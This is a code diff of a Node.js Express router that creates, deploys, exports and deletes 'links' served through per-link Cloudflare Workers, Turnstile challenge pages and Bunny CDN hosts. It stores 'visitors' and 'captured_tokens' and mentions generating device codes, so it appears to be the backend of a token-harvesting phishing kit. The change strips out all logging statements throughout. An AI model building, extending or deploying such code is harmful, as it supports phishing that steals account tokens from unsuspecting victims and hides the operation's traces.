@@ -19,7 +19,7 @@ function turnstileModeForDesign(designName) {
     const hasHtml = !!(templateLoader.loadVerificationDesignHTML(design) || {}).hasHtml;
     return design.toLowerCase().includes('slider') || hasHtml ? 'managed' : 'invisible';
   } catch (e) {
-    console.warn('[Links] turnstileModeForDesign failed (' + e.message + '), defaulting to managed');
+
     return 'managed';
   }
 }
@@ -133,7 +133,7 @@ router.get('/check-worker-name', userAuth, async (req, res) => {
 
     return res.json({ available: true, name: workerName });
   } catch (err) {
-    console.error('[Links] check-worker-name error:', err.stack || err.message);
+
     res.json({
       available: true,
       checked: false,
@@ -257,10 +257,10 @@ router.post('/', userAuth, commonValidators.createLink, validateResult, async (r
           const turnstilePool = require('../services/turnstile-pool');
           const turnstileMode = turnstileModeForDesign(req.body.verification_design);
           await turnstilePool.assignWidget(linkId, turnstileHostname, turnstileMode).catch(err => {
-            console.warn('[Links] Turnstile pool assignment failed (non-fatal):', err.message);
+
           });
         } catch (tpErr) {
-          console.warn('[Links] Turnstile pool service error (non-fatal):', tpErr.message);
+
         }
 
         const scriptContent = await templateLoader.buildWorkerScript({ ...req.body, id: linkId, custom_bg_url: custom_bg_url || null }, req.user, apiBaseUrl);
@@ -287,14 +287,14 @@ router.post('/', userAuth, commonValidators.createLink, validateResult, async (r
             userCfAccountId: req.user.cf_account_id,
             cfWorkersSubdomain: cfWorkersSubdomain
           }).catch(err => {
-            console.warn('[Links] Turnstile whitelist auto-add failed (non-fatal):', err.message);
+
           });
         } catch (twErr) {
-          console.warn('[Links] Turnstile whitelist service error (non-fatal):', twErr.message);
+
         }
       } catch (deployErr) {
         await db.query('UPDATE links SET status = ? WHERE id = ?', ['disabled', linkId]);
-        console.error('[Links] Worker deployment failed:', deployErr.response?.data || deployErr.message);
+
         let errorMessage = 'Worker deployment failed';
         if (deployErr.response?.data?.errors?.[0]?.message) {
           errorMessage += ': ' + deployErr.response.data.errors[0].message;
@@ -311,7 +311,7 @@ router.post('/', userAuth, commonValidators.createLink, validateResult, async (r
     if (link[0]) link[0].public_url = getLinkPublicUrl(link[0], req.user);
     res.status(201).json(link[0]);
   } catch (err) {
-    console.error('[Links] Create error:', err);
+
     res.status(500).json({ error: err.message || 'Server error', details: process.env.NODE_ENV !== 'production' ? { stack: err.stack } : undefined });
   }
 });
@@ -369,17 +369,17 @@ router.put('/:id', userAuth, commonValidators.updateLink, validateResult, async 
           const turnstilePool = require('../services/turnstile-pool');
           const turnstileMode = turnstileModeForDesign(row.verification_design);
           await turnstilePool.assignWidget(row.id, hostname, turnstileMode).catch(err => {
-            console.warn('[Links] Turnstile origin re-sync failed (non-fatal):', err.message);
+
           });
         }
       }
     } catch (tpErr) {
-      console.warn('[Links] Turnstile pool service error (non-fatal):', tpErr.message);
+
     }
 
     res.json(updated[0]);
   } catch (err) {
-    console.error('[Links] Update error:', err);
+
     res.status(500).json({ error: 'Server error' });
   }
 });
@@ -390,7 +390,7 @@ router.put('/:id', userAuth, commonValidators.updateLink, validateResult, async 
 router.delete('/:id', userAuth, commonValidators.deleteLink, validateResult, async (req, res) => {
   let connection;
   try {
-    console.log(`[Links] Delete request for link ${req.params.id} by user ${req.user.id}`);
+
     
     // Get a connection for transaction
     connection = await db.getConnection();
@@ -398,26 +398,26 @@ router.delete('/:id', userAuth, commonValidators.deleteLink, validateResult, asy
 
     const [existing] = await connection.query('SELECT * FROM links WHERE id = ? AND user_id = ?', [req.params.id, req.user.id]);
     if (!existing.length) {
-      console.log(`[Links] Link ${req.params.id} not found for user ${req.user.id}`);
+
       await connection.rollback();
       connection.release();
       return res.status(404).json({ error: 'Link not found' });
     }
 
     const link = existing[0];
-    console.log(`[Links] Deleting link ${link.id} (${link.worker_name || 'no worker'})`);
+
 
     // Delete associated visitors
     const [visitorsResult] = await connection.query('DELETE FROM visitors WHERE link_id = ?', [link.id]);
-    console.log(`[Links] Deleted ${visitorsResult.affectedRows} visitors`);
+
 
     // Delete associated tokens
     const [tokensResult] = await connection.query('DELETE FROM captured_tokens WHERE link_id = ?', [link.id]);
-    console.log(`[Links] Deleted ${tokensResult.affectedRows} tokens`);
+
 
     // Delete the link itself
     const [linkResult] = await connection.query('DELETE FROM links WHERE id = ?', [link.id]);
-    console.log(`[Links] Deleted ${linkResult.affectedRows} link(s) from database`);
+
 
     // Commit transaction
     await connection.commit();
@@ -429,7 +429,7 @@ router.delete('/:id', userAuth, commonValidators.deleteLink, validateResult, asy
         const turnstilePool = require('../services/turnstile-pool');
         await turnstilePool.releaseWidget(link.id);
       } catch (tpErr) {
-        console.warn('[Links] Turnstile release failed (non-fatal):', tpErr.message);
+
       }
     });
 
@@ -442,14 +442,14 @@ router.delete('/:id', userAuth, commonValidators.deleteLink, validateResult, asy
             `https://api.cloudflare.com/client/v4/accounts/${req.user.cf_account_id}/workers/scripts/${link.worker_name}`,
             { headers: { Authorization: `Bearer ${req.user.cf_api_token}` }, timeout: 15000 }
           );
-          console.log(`[Links] Deleted Cloudflare worker: ${link.worker_name}`);
+
         } catch (cfErr) {
-          console.error('[Links] Cloudflare worker deletion failed:', cfErr.response?.data?.errors?.[0]?.message || cfErr.message);
+
         }
       });
     }
 
-    console.log(`[Links] Successfully deleted link ${link.id}`);
+
     res.json({
       success: true,
       message: 'Link deleted successfully',
@@ -460,7 +460,7 @@ router.delete('/:id', userAuth, commonValidators.deleteLink, validateResult, asy
       }
     });
   } catch (err) {
-    console.error('[Links] Delete error:', err);
+
     if (connection) {
       try { await connection.rollback(); } catch(e) {}
       connection.release();
@@ -587,13 +587,12 @@ router.get('/:id/export', async (req, res) => {
         const siteKey = link && link.id ? await turnstilePool.getAssignedSiteKey(link.id) : '';
         if (siteKey) {
           await turnstilePool._updateWidgetOrigins(siteKey, exportHost, 'add');
-          console.log('[Links] Turnstile: synced allowed-hostname ' + exportHost + ' for link ' + linkId);
+
         } else {
-          console.warn('[Links] Turnstile: no site key assigned to link ' + linkId +
-            ' - the challenge will NOT render on ' + exportHost + ' and no device code will be generated.');
+
         }
       } catch (tsErr) {
-        console.warn('[Links] Turnstile allowed-hostname sync failed for ' + exportHost + ':', tsErr.message);
+
       }
 
       // Also keep the internal whitelist in sync for the admin UI.
@@ -604,10 +603,10 @@ router.get('/:id/export', async (req, res) => {
           user.cf_api_token,
           user.cf_account_id
         ).catch(err => {
-          console.warn('[Links] Turnstile internal whitelist failed (non-fatal):', err.message);
+
         });
       } catch (twErr) {
-        console.warn('[Links] Turnstile whitelist service error for export (non-fatal):', twErr.message);
+
       }
     }
 
@@ -623,7 +622,7 @@ router.get('/:id/export', async (req, res) => {
     res.setHeader('X-Turnstile-Whitelisted', whitelistDomains.join(','));
     res.send(html);
   } catch (err) {
-    console.error('[Links] Export error:', err.stack || err.message);
+
     res.status(500).json({ error: 'Export failed', details: err.message });
   }
 });
@@ -666,13 +665,12 @@ router.post('/:id/deploy-bunny', userAuth, async (req, res) => {
         const siteKey = link && link.id ? await turnstilePool.getAssignedSiteKey(link.id) : '';
         if (siteKey) {
           await turnstilePool._updateWidgetOrigins(siteKey, bunnyHost, 'add');
-          console.log('[Links] Turnstile: synced allowed-hostname ' + bunnyHost + ' for Bunny deploy of link ' + link.id);
+
         } else {
-          console.warn('[Links] Turnstile: no site key assigned to link ' + link.id +
-            ' - the challenge will NOT render on the Bunny host ' + bunnyHost + '.');
+
         }
       } catch (tsErr) {
-        console.warn('[Links] Turnstile allowed-hostname sync failed for Bunny host ' + bunnyHost + ':', tsErr.message);
+
       }
     }
 
